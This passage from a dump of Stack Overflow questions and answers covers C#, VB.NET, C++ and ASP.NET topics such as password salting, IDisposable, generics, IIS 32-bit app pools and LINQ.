<p>Additionally, if <code>UIView*</code> contained the method declaration that took a <code>CGFloat</code>, the compiler would call the method appropriately. To summarize, this is not a polymorphism issue; it's a missing method signature issue.</p>
"
"<p>I've been reading up on the benefits of salting and hashing passwords, but one thing still eludes me... </p>

<p>When I provide a random salt for each user, how do I then know what the salt was when I try to authenticate them to login?</p>

<p>so if I do.. </p>

<p>HASHPW = PW.RANDOMNUMBER</p>

<p>I could store the random number in the database, but that seems to kill the entire point of adding the salt.. doesn't it? I could also use a non random number for each salt, but then that also kills the point of the salt because if they figure it out they have all my users passwords...</p>

<p>I just started learning PHP and MySQL and abstract things like this have been confusing me</p>

<p>Thanks!</p>
","33708","","<p>Salt is randomly generated for each user but it's saved somewhere in the database. You look up the salt for the particular user and use it to authenticate the user.</p>

<p>The point is, since salt is different for each user, you cannot use a prebuilt dictionary of hashes to map the hashed passwords to clear text (<a href=""http://en.wikipedia.org/wiki/Rainbow%5Ftable"">rainbow attack</a>).</p>
"
"<p>How do I bitwise shift right/left in VB.NET? Does it even have <a href=""http://msdn.microsoft.com/en-us/library/2h9cz2eb%28VS.80%29.aspx"">operators</a> for this, or do I have to use some utility method?</p>
","33708","","<p>VB.NET has had bit shift operators (<code>&lt;&lt;</code>, <code>&gt;&gt;</code>) since 2003.</p>
"
"<p>How do you type binary literals in VB.NET? </p>

<pre><code>&amp;HFF          // literal Hex -- OK
&amp;b11111111    // literal Binary -- how do I do this?
</code></pre>
","33708","","<p>You don't.</p>

<p>VB.NET supports decimal (without prefix), octal (with <code>&amp;O</code> prefix), and hexadecimal (with <code>&amp;H</code> prefix) <a href=""http://msdn.microsoft.com/en-us/library/aa711649%28VS.71%29.aspx"" rel=""nofollow"">integer literals</a> directly.</p>
"
"<p>I wrote a method that extracts fields from an object like this:</p>

<pre><code>private static string GetHTMLStatic(ref Object objectX, ref List&lt;string&gt; ExludeFields)
{
    Type objectType = objectX.GetType();
    FieldInfo[] fieldInfo = objectType.GetFields();

    foreach (FieldInfo field in fieldInfo)
    {
        if(!ExludeFields.Contains(field.Name))
        {
            DisplayOutput += GetHTMLAttributes(field);
        }                
    }

    return DisplayOutput;
}
</code></pre>

<p>Each field in my class also has it's own attributes, in this case my attribute is called HTMLAttributes. Inside the foreach loop I'm trying to get the attributes for each field and their respective values. It currently looks like this:</p>

<pre><code>private static string GetHTMLAttributes(FieldInfo field)
{
    string AttributeOutput = string.Empty;

    HTMLAttributes[] htmlAttributes = field.GetCustomAttributes(typeof(HTMLAttributes), false);

    foreach (HTMLAttributes fa in htmlAttributes)
    {
        //Do stuff with the field's attributes here.
    }

    return AttributeOutput;
}
</code></pre>

<p>My attributes class looks like this:</p>

<pre><code>[AttributeUsage(AttributeTargets.Field,
                AllowMultiple = true)]
public class HTMLAttributes : System.Attribute
{
    public string fieldType;
    public string inputType;

    public HTMLAttributes(string fType, string iType)
    {
        fieldType = fType.ToString();
        inputType = iType.ToString();
    }
}
</code></pre>

<p>This seems logical but it won't compile, I have a red squiggly line in the GetHTMLAttributes() method under:</p>

<pre><code>field.GetCustomAttributes(typeof(HTMLAttributes), false);
</code></pre>

<p>The field I'm trying to extract the attributes from is in another class used like this:</p>

<pre><code>[HTMLAttributes(""input"", ""text"")]
public string CustomerName;
</code></pre>

<p>From my understanding (or lack thereof) this should work? Please expand my mind fellow developers!</p>

<p><strong>*Edit, compiler error</strong>:</p>

<blockquote>
  <p>Cannot implicitly convert type
  'object[]' to 'data.HTMLAttributes[]'.
  An explicit conversion exists (are you
  missing a cast?)</p>
</blockquote>

<p>I have tried casting it like this:</p>

<pre><code>(HTMLAttributes)field.GetCustomAttributes(typeof(HTMLAttributes), false);
</code></pre>

<p>But that also doesn't work, I get this compiler error:</p>

<blockquote>
  <p>Cannot convert type 'object[]' to
  'data.HTMLAttributes'</p>
</blockquote>
","33708","","<p><code>GetCustomAttributes</code> method returns an <code>object[]</code>, not <code>HTMLAttributes[]</code>. The reason it returns <code>object[]</code> is that it has been there since 1.0, before .NET generics see the light of day.</p>

<p>You should manually cast each item in the return value to <code>HTMLAttributes</code>.</p>

<p>To fix your code, you simply need to change the line to:</p>

<pre><code>object[] htmlAttributes = field.GetCustomAttributes(typeof(HTMLAttributes), false);
</code></pre>

<p><code>foreach</code> will take care of the cast for you.</p>

<h3>Update:</h3>

<p>You <strong>shouldn't</strong> cast the returned array to <code>HTMLAttributes[]</code>. The return value is not <code>HTMLAttributes[]</code>. It's an <code>object[]</code> containing elements of type <code>HTMLAttributes</code>. If you want a <code>HTMLAttribute[]</code> typed object (which you don't need in this specific code snippet, <code>foreach</code> would suffice), you should cast each element of array individually to <code>HTMLAttribute</code>; perhaps using LINQ:</p>

<pre><code>HTMLAttributes[] htmlAttributes = returnValue.Cast&lt;HTMLAttributes&gt;().ToArray();
</code></pre>
"
"<p>I add a label on to the view
UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10.0f, 320.0f, 300.0f, 75.0f)]; 
[titleLabel setText:[BusinessLogic instance].homeMessage];</p>

<p>then I move to another view and come back. This results in having two label controls on top of each other. What I want to do is:
check if the label control has been added already. If not add it and set the text. If it is, just set the text.</p>

<p>What's the best way to do it. I want to learn the proper way as I have already a couple of disgusting ideas of how to do it.</p>

<p>Thanks.
mE</p>
","33708","","<p>Add a property to your class to store a reference to your label. If you don't store it anywhere, you can't change its text easily in the future:</p>

<pre><code>// header
@property (nonatomic, retain) IBOutlet UILabel *titleLabel;
// implementation
@synthesize titleLabel;
</code></pre>

<p>Create the <code>UILabel</code> instance if <code>titleLabel</code> is <code>nil</code> and assign to it:</p>

<pre><code>if (self.titleLabel == nil) {
   UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(10.0f, 320.0f, 300.0f, 75.0f)];
   self.titleLabel = titleLabel;
   [titleLabel release];
   // add to the view here.
}
self.titleLabel.text = newText;
</code></pre>
"
"<p>I don't think this question has been asked before but I'm a bit confused on the best way to implement IDisposable on a sealed class - more particularly a sealed class that does not inherit from a base class ( i.e a 'pure sealed class' which is my made up term ).<br>
Dunno about you but I find the guidelines on implementing IDisposable very confusing - however what I want to know is if this would be sufficient and safe  </p>

<p>I'm doing some P/Invoke code that allocates an <code>IntPtr</code> through <code>Marshal.AllocHGlobal</code> and naturally, I want to cleanly dispose of the unmanaged memory I've created. So I'm thinking of something like this</p>

<pre><code>using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public sealed class MemBlock : IDisposable
{
     IntPtr ptr;
     int length;

     MemBlock(int size)
     {
           ptr = Marshal.AllocHGlobal(size);
           length = size;
     }

     public void Dispose()
     {
          if (ptr != IntPtr.Zero)
          {
               Marshal.FreeHGlobal(ptr);
               ptr = IntPtr.Zero;
               GC.SuppressFinalize(this);
          }
     }

     ~MemBlock()
     {
           Dispose();
     }

}
</code></pre>

<p>I'm assuming that because <code>MemBlock</code> is completely sealed and never derives from another class that implementing a <code>virtual protected Dispose(bool disposing)</code> is not necessary.  </p>

<p>Also, is the finalizer strictly necessary?  </p>

<p>All thoughts welcome</p>
","33708","","<p>The finalizer is necessary as a fallback mechanism to eventually free unmanaged resources if you forgot to call <code>Dispose</code>.</p>

<p>No, you shouldn't declare a <code>virtual</code> method in a <code>sealed</code> class. It wouldn't compile at all. Also, it's not recommended to declare new <code>protected</code> members in <code>sealed</code> classes.</p>
"
"<p>I'm writing some code that looks like this:</p>

<pre><code>while(true) {
    switch(msg-&gt;state) {
    case MSGTYPE: // ... 
        break;
    // ... more stuff ...
    case DONE:
        break; // **HERE, I want to break out of the loop itself**
    }
}
</code></pre>

<p>Is there any direct way to do that?</p>

<p>I know I can use a flag, and break from the loop by putting a conditional break just after the switch. I just want to know if C++ has some construct for this already.</p>
","33708","","<p>You can use <code>goto</code>.</p>

<pre><code>while ( ... ) {
   switch( ... ) {
     case ...:
         goto exit_loop;

   }
}
exit_loop: ;
</code></pre>
"
"<p>In C++, I can do something like this:</p>

<pre><code>int i[10] = new int[10];
int *p = &amp;i[5];
</code></pre>

<p>Then, I can always know that p points to the 5th element of int array i, regardless of i's contents.</p>

<p>Is there any way to do something similar in C#?  </p>

<p>I realize this is likely one of the ways in which C# ""protects"" us from ourselves, so i'm not looking for an exact equivelent, but rather a similar concept... that is, being able to refer to the contents of some other variable, rather than the instance of the variable itself.</p>

<p>Here's my use case i'm thinking  of.  I have an array of strings.  I would like to have another array of references to those array elements.  Something like this (obviously not valid code):</p>

<pre><code>string[] s = new string[] { ""one"", ""two"", ""three"", ""four"", ""five"", ""six"" };
stringref[] sr = new stringref[] { &amp;s[0], &amp;s[1], &amp;s[2], &amp;s[3], &amp;s[4], &amp;s[5] };

Console.WriteLine(sr[1]); // == ""two""
s[1] = ""two point zero"";
Console.WriteLine(sr[1]); // == ""two point zero""
</code></pre>

<p>Certainly, ref paramets do this, and out parameters allow you to write to a specific variable.  But what about non-parameters?  Can you store a ref?  Can you keep an array of refs or a dictionary?</p>

<p>It seems like if the ability to do it with parameters is present, there should be a way to do it without them.</p>
","33708","","<p>No. Putting <code>unsafe</code> code aside, which does allow holding pointers to memory locations, there's no way to store a reference to a variable in C#.</p>

<p><code>ref</code> and <code>out</code> arguments provide the only means to take a reference but you can't save them anywhere.</p>

<p>You can workaround this limitation by wrapping fields in a <code>class</code> and using its reference instead. This is what the compiler does to capture variables in closures:</p>

<p>For instance, when you write:</p>

<pre><code>int integer = 0;
Action&lt;int&gt; method = i =&gt; Console.WriteLine(i + integer);
integer = 42;
method(100); // prints 142, not 100
</code></pre>

<p>In the second line, the compiler will have to take out the anonymous method and store it as a separate method in the class. Obviously, that method won't have access to <code>integer</code> variable. It somehow needs to pass a ""reference"" to <code>integer</code> variable to that anonymous method. Since it's not possible, it'll generate a <code>class</code> with a field to hold an integer and uses an instance of that class to store the variable. Basically, the local variable is promoted to a field in a class and is stored in the heap.</p>
"
"<p>Is the following code legal?</p>

<pre><code>char* randomMethod1() {
    char* ret = ""hello"";
    return ret;
}
</code></pre>

<p>and this one?</p>

<pre><code>char* randomMethod2() {
    char* ret = new char[10];

    for (int i = 0; i &lt; 9; ++i) {
        ret[i] = (char)(65 + i);
    }

    ret[9] = '\0';

    return ret;
}
</code></pre>

<p>I'd say the first one is legal, as what you are actually doing is returning a pointer to a string literal that I think is loaded from the string table of the program. However, I'd say the second is not. I'd say in the second method you are allocating memory on the stack, which as soon as you leave the function, might be used by another method, turning to trash the pointer you are returning. How is that it really works?</p>

<p>edit: Ok, here is the disassembled code. Could anyone explain me how can I see it is being allocated on the heap?</p>

<pre><code>char* randomMethod2() {
000536E0  push        ebp  
000536E1  mov         ebp,esp 
000536E3  sub         esp,0E4h 
000536E9  push        ebx  
000536EA  push        esi  
000536EB  push        edi  
000536EC  lea         edi,[ebp-0E4h] 
000536F2  mov         ecx,39h 
000536F7  mov         eax,0CCCCCCCCh 
000536FC  rep stos    dword ptr es:[edi] 
    char* ret = new char[10];
000536FE  push        0Ah  
00053700  call        operator new (511E0h) 
00053705  add         esp,4 
00053708  mov         dword ptr [ebp-0E0h],eax 
0005370E  mov         eax,dword ptr [ebp-0E0h] 
00053714  mov         dword ptr [ret],eax 

    for (int i = 0; i &lt; 9; ++i) {
00053717  mov         dword ptr [i],0 
0005371E  jmp         randomMethod2+49h (53729h) 
00053720  mov         eax,dword ptr [i] 
00053723  add         eax,1 
00053726  mov         dword ptr [i],eax 
00053729  cmp         dword ptr [i],9 
0005372D  jge         randomMethod2+5Fh (5373Fh) 
        ret[i] = (char)(65 + i);
0005372F  mov         eax,dword ptr [i] 
00053732  add         eax,41h 
00053735  mov         ecx,dword ptr [ret] 
00053738  add         ecx,dword ptr [i] 
0005373B  mov         byte ptr [ecx],al 
    }
0005373D  jmp         randomMethod2+40h (53720h) 

    ret[9] = '\0';
0005373F  mov         eax,dword ptr [ret] 
00053742  mov         byte ptr [eax+9],0 

    return ret;
00053746  mov         eax,dword ptr [ret] 
}
00053749  pop         edi  
0005374A  pop         esi  
0005374B  pop         ebx  
0005374C  add         esp,0E4h 
00053752  cmp         ebp,esp 
00053754  call        @ILT+320(__RTC_CheckEsp) (51145h) 
00053759  mov         esp,ebp 
0005375B  pop         ebp  
0005375C  ret
</code></pre>
","33708","","<p>Both are legal. In the second one, you are <strong>not</strong> allocating memory from the stack. You are using <code>new</code> and it allocates memory from the heap. If you don't free the pointer returned from the second method using <code>delete</code>, <strong>you'll have a memory leak</strong>.</p>

<p>By the way, stack allocated arrays are declared like this:</p>

<pre><code>char x[10]; // note that there's no `new`.
</code></pre>

<h3>Update:</h3>

<p>This line calls <code>operator new</code> which allocates memory from the heap and initializes the object.</p>

<pre><code>00053700  call        operator new (511E0h)
</code></pre>
"
"<p>I know it isn't possible to inherit from a generic type parameter, but it would be handy when implementing a common proxy for derivatives of an abstract type :-)</p>

<p>Does anyone know why this isn't possible?</p>

<p>Example C#:</p>

<pre><code>abstract class Foo
{
  public virtual void Bar()
  {
     // nop
  }
}

class FooProxy&lt;TFoo&gt; : TFoo
  where TFoo : Foo
{

  public override void Bar()
  {
    // do some stuff before
    base.Bar();
    // do some stuff after
  }

}
</code></pre>

<p>EDIT: Some more code to illustrate an example of how this could be used. Consider the following derivatives of Foo:</p>

<pre><code>class FooX : Foo
{
  public string X { get; set; }
  public override void Bar()
  {
    Console.WriteLine(""Doing Bar X"");
  }
}

class FooY : Foo
{
  public string Y { get; set; }
  public override void Bar()
  {
    Console.WriteLine(""Doing Bar Y"");
  }
}
</code></pre>

<p>And the calling code:</p>

<pre><code>FooProxy&lt;FooX&gt; fooXProxy = new FooProxy&lt;FooX&gt;();
fooXProxy.X = ""test X"";
fooXProxy.Bar();

FooProxy&lt;FooY&gt; fooYProxy = new FooProxy&lt;FooY&gt;();
fooYProxy.Y = ""test Y"";
fooYProxy.Bar();
</code></pre>

<p>The code in the FooProxy override of Bar() method will be reused when using FooX and FooY.</p>

<p>EDIT: Revised as per Pete OHanlon's answer: made Bar() method virtual.</p>
","33708","","<p>Because you can't. Generics are not templates. You shouldn't think about them like C++ templates and expect the same behavior. They are fundamentally different concepts.</p>

<p>The C# specification explicitly prohibits usage of type parameters as base class:</p>

<blockquote>
  <h3>C# 3.0 Language Specification: Type Parameters (Â§4.5)</h3>
  
  <p>A type parameter cannot be used directly to declare a base class (Â§10.2.4) or interface (Â§13.1.3).</p>
</blockquote>

<h3>Update:</h3>

<p>I understand what you want to do and its use. This is a traditional use case of C++ templates. Specifically, if this was possible to do using C# generics, things like <a href=""http://code.google.com/p/moq/""><code>Moq</code> library</a> could benefit from it. The problem is, C++ templates are compile time ""find and replace"" constructs while C# generics are a run time thing. </p>

<p>To demonstrate this fact, for this class:</p>

<pre><code>class Test&lt;T&gt; where T : class {
    // whatever contents it might have...
}
</code></pre>

<p>only a single IL will be emitted at compile time and at run time, the JIT compiler would generate a <strong>single</strong> native code for all reference-type type parameters. This is not like C++ templates at all, where native code would be emitted for every <code>T</code> separately (it's subject to optimization but conceptually, they are completely separate pieces of code).</p>
"
"<p>I am trying to deploy <a href=""http://galmod.codeplex.com/"">GAL Modifier</a>, which is an ASP.NET website which uses Microsoft Access on a Windows 2003 x64 machine. However there is no JET driver on x64 (see <a href=""http://social.msdn.microsoft.com/Forums/en-US/netfx64bit/thread/4ff1791f-3bc8-4716-a15a-356206d750ba"">here</a>), so the change is to use change the target CPU to x86. </p>

<p>However as it is a web site there is no option in Visual Studio except Any CPU, so how can I change the settings to force it to use x86?</p>
","33708","","<p>You should make the application pool 32 bit. Go to Application Pools in IIS7 Management Console, right click your application pool and select ""Set Application Pool Defaults..."" item.</p>

<p>In the properties dialog, set ""Enable 32 Bit Applications"" to ""True.""</p>

<p>This will make the application pool process 32 bit (running in WOW64 mode) and loads the 32 bit version of .NET Framework in the process.</p>

<p>In IIS6, basically the same thing applies. You should switch to 32 bit application pool to <a href=""http://www.microsoft.com/technet/prodtechnol/WindowsServer2003/Library/IIS/0aafb9a0-1b1c-4a39-ac9a-994adc902485.mspx?mfr=true"">enable 32 bit ISAPI extensions</a>:</p>

<pre><code>cscript.exe adsutil.vbs set W3SVC/AppPools/Enable32BitAppOnWin64 ""true""
</code></pre>

<p>Also, you need to change application mappings from <code>aspnet_isapi.dll</code> in <code>Framework64</code> folder to <code>aspnet_isapi.dll</code> in <code>Framework</code> folder. The same thing should be done with <code>aspnet_filter.dll</code>. </p>

<p>You can re-register ASP.NET on the server instead of manually changing the DLL configurations:</p>

<pre><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\aspnet_regiis.exe -i -enable
</code></pre>
"
"<pre><code>public class ClassA
{
    public static readonly string processName;
} 

public class ClassB : ClassA
{
    static ClassB()
    {
        processName = ""MyProcess.exe"";
    }
}
</code></pre>

<p>I am getting an error while compiling the above C# code. </p>

<p>The error says -- ""A static readonly field cannot be assigned to (except in a static constructor or a variable initializer)""</p>

<p>But I am assigning it in a static constructor.</p>

<p>The need for such a static variable is that, the base class has methods that uses this variable, but the derived classes and the base class must have different values  for this variable. But the value is constant across all instances of the respective class. It must be readonly because, it must not be changed by anywhere.</p>

<p>What is the error in the above code? (If there is any) I do not seem to be able to spot one. The error message is not helping. As I am not doing anything wrong according to it.</p>

<p>If there is an error, how can I implement this functionality? I know a simple workaround would be to make it an instance variable and assign them different values in the derived classes. But that is unnecessary as the value is constant across all the instances of the respective class.</p>
","33708","","<p>In your example, only a single field will exist, that of the base class and you can't have different values in a single field. Beside that, you can only initialize <code>readonly</code> fields in the same class, not in derived classes. A workaround could be defining a generic class like:</p>

<pre><code>static class ProcessNames&lt;T&gt; {
   public static string Value { get; set; }
}
</code></pre>

<p>and use <code>ProcessNames&lt;DerivedClassType&gt;.Value</code> instead. Obviously, the value will be publicly accessible this way.</p>

<p>However, you should see if defining the field in each derived class separately fits your need and only resort to workarounds if it does not.</p>
"
"<p>working with: ASP.net using VB.net connecting to MS SQL Server</p>

<p>What I'm trying to do is take the result of a SQL select query and place that in a string variable so it can be used in things like a textbox or label. code so far that doesn't work...</p>

<pre><code>Imports System.Data.SqlClient
</code></pre>

<p>Partial Class dev_Default
    Inherits System.Web.UI.Page</p>

<pre><code>Protected Sub form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles form1.Load


    Dim cnPodaci As New SqlConnection
    cnPodaci.ConnectionString = ""Data Source=&lt;server&gt;;Initial Catalog=&lt;DB&gt;;User ID=&lt;UserName&gt;;Password=&lt;Password&gt;""
    cnPodaci.Open()
    Dim cm As New SqlCommand
    cm.CommandText = ""SELECT * FROM tbl1""
    cm.Connection = cnPodaci
    Dim dr As SqlDataReader
    dr = cm.ExecuteReader

    TextBox1.Text = dr.GetString(0)


    cnPodaci.Close()

End Sub
</code></pre>

<p>End Class</p>
","33708","","<p>If the query is supposed to return a single value, you can simply use the <code>ExecuteScalar</code> method:</p>

<pre><code> TextBox1.Text = DirectCast(cm.ExecuteScalar(), String)
</code></pre>
"
"<p>IUnknown::QueryInterface() is passed a void** parameter denoting an address where to put the retrieved interface.</p>

<pre><code>STDMETHOD QueryInterface(/* [in] */ REFIID riid, /* [iid_is][out] */ void** ppvObject)
</code></pre>

<p>Should the implementation of QueryInterface() check this pointer for being null (and then immediately return E_POINTER) or just write there?</p>

<p>I've seen a lot of COM-related code and almost everywhere no check is performed. Hypothetically someone could of course pass null pointer as this parameter, but is such check really needed?</p>
","33708","","<p>You (the caller) don't need to check the pointer for not being <code>NULL</code>. </p>

<p>However, you should check the returned <code>HRESULT</code>. The method will return <code>E_POINTER</code> if the output pointer is <code>NULL</code> and <code>E_NOINTERFACE</code> if the interface is unsupported.</p>

<p><hr /></p>

<p>The callee should check the pointer for not being <code>NULL</code> and return <code>E_POINTER</code> if it is <code>NULL</code>:</p>

<blockquote>
  <h3><a href=""http://msdn.microsoft.com/en-us/library/ms682521%28VS.85%29.aspx"" rel=""nofollow"">MSDN</a>: Return Value:</h3>
  
  <p>This method returns <code>S_OK</code> if the interface is supported, and <code>E_NOINTERFACE</code> otherwise. If <code>ppvObject</code> is <code>NULL</code>, this method returns <code>E_POINTER</code>.</p>
</blockquote>
"
"<p>I have several <code>Expression&lt;Func&lt;User,bool&gt;&gt;</code> expressions that shares properties. For example,</p>

<pre><code>Expression&lt;Func&lt;User, bool&gt;&gt; e1 = 
  (User u) =&gt; u.IsActive &amp;&amp; u.Group != ""PROCESS"" &amp;&amp; u.Name != null;
Expression&lt;Func&lt;User, bool&gt;&gt; e2 = 
  (User u) =&gt; u.IsActive &amp;&amp; u.Group != ""PROCESS"" &amp;&amp; u.Name != ""A"";
Expression&lt;Func&lt;User, bool&gt;&gt; e3 = 
  (User u) =&gt; u.IsActive &amp;&amp; u.Group != ""PROCESS"" &amp;&amp; u.Name != ""B"";
</code></pre>

<p>Is there an easy way to put the <code>u.IsActive &amp;&amp; u.Group != ""PROCESS""</code> in a variable and use it in e1, e2 and e3? Edited : And I still want the same tree.</p>

<p>Seems I can do it by building the expression with <code>Expression.Lambda&lt;Func&lt;User, bool&gt;&gt;(BinaryExpression.AndAlso(</code> etc... But rather than simplifying my code it made it more difficult to read.</p>
","33708","","<p>I believe there's no cleaner way to do that for your case. You can use <code>BinaryExpression</code> as you mentioned. You can encapsulate the <code>BinaryExpression</code> and <code>Expression.Lambda</code> calls into a method and call that instead (like <a href=""http://www.albahari.com/nutshell/predicatebuilder.aspx"" rel=""nofollow"">PredicateBuilder.And</a>) but none of those are as clean as the current syntax IMO.</p>
"
"<p>I have the following XML structure:</p>

<pre><code>&lt;row&gt;
  &lt;field name=""Id""&gt;1&lt;/field&gt;
  &lt;field name=""AreaId""&gt;1&lt;/field&gt;
  &lt;field name=""Name""&gt;×ª&amp;quot;×&lt;/field&gt;
&lt;/row&gt;
&lt;row&gt;
  &lt;field name=""Id""&gt;2&lt;/field&gt;
  &lt;field name=""AreaId""&gt;4&lt;/field&gt;
  &lt;field name=""Name""&gt;×××××××&lt;/field&gt;
&lt;/row&gt;
</code></pre>

<p>I want to iterate over the <code>name</code> nodes with Linq.
I tried this:</p>

<pre><code>var items = (from i in doc.Descendants(""row"")
                     select new
                     {
                         Text = i.Value

                     }).ToList();
</code></pre>

<p>But it didn't work the way I need it to. Any suggestions?</p>
","33708","","<pre><code>var items = doc.Descendants(""field"")
               .Where(node =&gt; (string)node.Attribute(""name"") == ""Name"")
               .Select(node =&gt; node.Value.ToString())
               .ToList();
</code></pre>
"
"<p>I want to create a ""temporary cache lookup"" to speed up a file lookup on my webserver.</p>

<p>What I have now is a folder full of images, and if a user requests an image I use a File.Exists(...) to check to see if the image exists.  If it doesn't, download it from another server, and either way, redirect the user to it.</p>

<p>The problem with this is that a lot of requests at once cause File.Exists() to hang. I would like to keep a quick and dirty HashSet of filenames known to be in the local folder, so that if the the user requests a file, and it exists in the HashSet, just redirect to it without doing the File.Exists(), if it doesn't exist int he HashSet, do the File.Exists() then add it.</p>

<p>I know that the HashSet would get blown away if the server ever gets restarted, but I'm not worried about that, because it would quickly ""rebuild"" itself with the most requested images using the above scenario.</p>

<p>The main question is, since this object would be getting called from multiple users, and various requests would all be adding items to the set, would this cause a problem?  Up to now all I've used in the static global sense on webservers is DB connection strings or an email address to send alerts to, etc.</p>

<p><strong>Edit with regards to race conditions:</strong>
<br>Yes I was thinking of race conditions.  But is a race condition even possible on a single HashSet?  Since it only allows unique values, wouldnt the second attempt to add a value fail?  At which point I would just ignore the error and continue on.</p>
","33708","","<p>It makes sense. However, make sure you take care of possible race conditions. You could use the <a href=""http://msdn.microsoft.com/en-us/library/system.threading.readerwriterlockslim.aspx"" rel=""nofollow""><code>ReaderWriterLockSlim</code> class</a> to control access to the object from different threads.</p>

<h3>UPDATE:</h3>

<p>You absolutely need to lock the object appropriately, as the <code>Add</code> method is not an atomic operation. You can even leave the object in an inconsistent state if you add two things simultaneously.</p>
"
"<p>In C++, do methods only get inlined if they are explicitly declared <code>inline</code> (or defined in a header file), or are compilers allowed to inline methods as they see fit?</p>
","33708","","<p>Yes, the compiler can inline code even if it's not explicitly declared as <code>inline</code>.</p>

<p>Basically, as long as the semantics are not changed, the compiler can virtually do anything it wants to the generated code. The standard does not force anything special on the generated code.</p>
"
"<p>I am usingh VB.net, I have two textboxes please see below:</p>

<pre><code>&lt;tr id=""trCheckedBy2"" runat=""server""&gt;
    &lt;td&gt;
    Application Checked by 1:
    &lt;/td&gt;
    &lt;td&gt;
    &lt;asp:TextBox ID=""CheckedBy1TextBox"" runat=""server"" Text='&lt;%# Bind(""CheckedBy1"") %&gt;' /&gt;
    &lt;/td&gt;
    &lt;td&gt;
    Application Checked by 2:
    &lt;/td&gt;
    &lt;td &gt;
    &lt;asp:TextBox ID=""CheckedBy2TextBox""  runat=""server"" Text='&lt;%# Bind(""CheckedBy2"") %&gt;' /&gt;
    &lt;/td&gt;                                
&lt;/tr&gt;
</code></pre>

<p>Now I want to give error message <strong>""Username can not be same""</strong> when <strong>CheckedBy2TextBox</strong> text is same as <strong>CheckedBy1TextBox</strong>. It would be good if we can use .net validator.</p>

<p>Please suggest!</p>

<p>Thanks.</p>

<p>Best Regards,
MS</p>
","33708","","<p>Use a <a href=""http://msdn.microsoft.com/en-us/library/db330ayw%28VS.80%29.aspx"" rel=""nofollow"">CompareValidator control</a> with the <code>Operator</code> property set to <code>NotEqual</code>:</p>

<pre><code>&lt;asp:CompareValidator runat=""server""
                      ControlToValidate=""ID_Of_First_TextBox""
                      ControlToCompare=""ID_Of_Second_TextBox""
                      Operator=""NotEqual""
                      ErrorMessage=""Error_Message_Goes_Here"" /&gt;
</code></pre>
"
"<p>Finding myself in the situation where I have a method with this signature</p>

<pre><code>void DoSomething(IEnumerable&lt;T&gt; before, IEnumerable&lt;T&gt; after)
</code></pre>

<p>I find myself often having to call it when I've just got one element and not IEnumerable.</p>

<p>I thought of adding the three overloads, but that doesn't help when one of the arguments is null.</p>

<p>So I thought I could just 'wrap up' my single element in an IEnumerable and send it on, but I can't find anything on Enumerable which looks like what I want (maybe I'm not looking hard enough).</p>

<p>So I'm looking at something like this</p>

<pre><code>    public static IEnumerable&lt;T&gt; EnumerableUnit&lt;T&gt;(T item)
    {
        if(item != null) yield return item;
    }
</code></pre>

<p>Is this a good idea? Or is there something better I should be doing?</p>
","33708","","<p>This might help:</p>

<pre><code>new[]{obj}
</code></pre>
"
"<p>I'm trying to figure out how many times the <strong>maximum value</strong> of an array occurs within the array by using Linq's<a href=""http://msdn.microsoft.com/en-us/library/bb535181.aspx"" rel=""nofollow""><code>.Count()</code></a> with a predicate inside. However, I don't fully understand how to do it. From reading the MSDN's scant example I thought I understood, but apparently not!</p>

<p>This is what I thought of:</p>

<pre><code>string[] test = { ""1"", ""2"", ""3"", ""4"", ""4"" };
string max = test.Max();
Label1.Text = test.Count(p =&gt; p == max);
</code></pre>

<p>But that did not work. So I tried changing <strong>max</strong> to an integer to see if that would work, but that did not work either.</p>
","33708","","<p>Using <a href=""http://msdn.microsoft.com/en-us/library/bb535181.aspx""><code>Count(predicate)</code></a> is OK. You just need to convert the return value (which is an integer) to string.</p>

<pre><code>Label1.Text = test.Count(p =&gt; p == max).ToString();
</code></pre>
"
"<p>I have a requirement to verify that a user-specified URL is to an image. So really I need a way to determine that a URL string points to a valid image. How can I do this in .NET?</p>
","33708","","<p>You can't do that without downloading the file (at least a part of it). Use a <code>WebClient</code> to fetch the URL and try creating a new <code>Bitmap</code> from the returned <code>byte[]</code>. If it was successful, it's really an image. Otherwise, it will throw an exception somewhere in the process.</p>

<p>By the way, you <em>can</em> issue a <code>HEAD</code> request and check the <code>Content-Type</code> header in the response (if it's there). However, this method is not fool-proof. The server can respond with an invalid <code>Content-Type</code> header.</p>
"
"<p>Right now I have a base class for my pages which inherits <code>System.Web.UI.Page</code> and another base class for my usercontrols which inherits <code>System.Web.UI.UserControl</code>, these classes contains the same methods. Since C# doesn't support multiple inheritance I can't combine the two classes into one that inherits both Page and UserControl. </p>

<p>What would be the best way to keep the functionality in the two base classes but have the implementation of these methods in only one place?</p>

<p>I'm thinking of making a interface and let the two base classes call a third class that contains the implementation of the interface. Is there any better way so that when I add a new method I don't have to do it in three places (even though the implementation is only in the third class).</p>
","33708","","<p>If you are using C# 3.0, you can provide your helper methods as extension methods for the <code>System.Web.UI.Control</code> class, of which both <code>System.Web.UI.Page</code> and <code>System.Web.UI.UserControl</code> classes derive.</p>

<pre><code>public static class ControlExtensions {
    public static void DoSomething(this Control obj) {
       // do something
    }
}
</code></pre>

<p>In the <code>Page</code> or <code>UserControl</code>:</p>

<pre><code>this.DoSomething();
</code></pre>
"
"<p>This question may not be language specific.</p>

<ul>
<li>Is it possible to create a true random number ? </li>
<li>If not why random number generation has to go through some algorithm, why garbage values cannot act as random numbers.</li>
</ul>
","33708","","<p>It can. Depending on your definition of a random number:</p>

<p><a href=""http://dilbert.com/strips/comic/2001-10-25/""><img src=""http://dilbert.com/dyn/str%5Fstrip/000000000/00000000/0000000/000000/00000/2000/300/2318/2318.strip.gif"" alt=""You can never be sure"" title="""" /></a></p>

<p>In most applications, what you expect from a random number generator is to generate a sequence of numbers that are <strong>uniformly distributed</strong>. A garbage value does not provide this characteristic.</p>

<blockquote>
  <p>Is it possible to create a true random number?</p>
</blockquote>

<p>If you define ""truly random"" as unpredictable, the question is ""unpredictable by what?""</p>

<p>There are <a href=""http://en.wikipedia.org/wiki/Cryptographically%5Fsecure%5Fpseudorandom%5Fnumber%5Fgenerator"">cryptographically secure (pseudo-)random number generators</a> that try to hide the state of the random number generator from <em>user-level code</em>, that is, ideally, only kernel mode code can feasibly predict the next random number. </p>

